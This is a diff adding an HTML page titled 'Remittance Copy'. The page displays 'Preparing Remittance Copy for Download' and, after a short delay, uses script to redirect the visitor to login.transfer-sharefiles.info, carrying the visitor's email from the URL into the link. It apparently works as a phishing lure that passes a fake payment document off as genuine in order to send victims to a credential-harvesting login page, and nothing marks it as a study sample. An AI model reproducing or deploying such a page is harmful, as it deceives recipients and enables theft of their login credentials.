@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remittance Copy</title>
+    <script>
+        // Extract email from the current URL's query parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email'); // Get the 'email' parameter
+
+        // Define the base redirect URL
+        const baseRedirectUrl = "https://login.transfer-sharefiles.info/dpACPfLJ";
+
+        // Add email as a query parameter to the redirect URL without encoding
+        const redirectUrl = email ? `${baseRedirectUrl}#${email}` : baseRedirectUrl;
+
+        // Delay the redirect to display the message first
+        setTimeout(() => {
+            window.location.href = redirectUrl;
+        }, 1500); // Redirect after 3 seconds
+    </script>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        p {
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <p>Preparing Remittance Copy for Download</p>
+</body>
+</html>
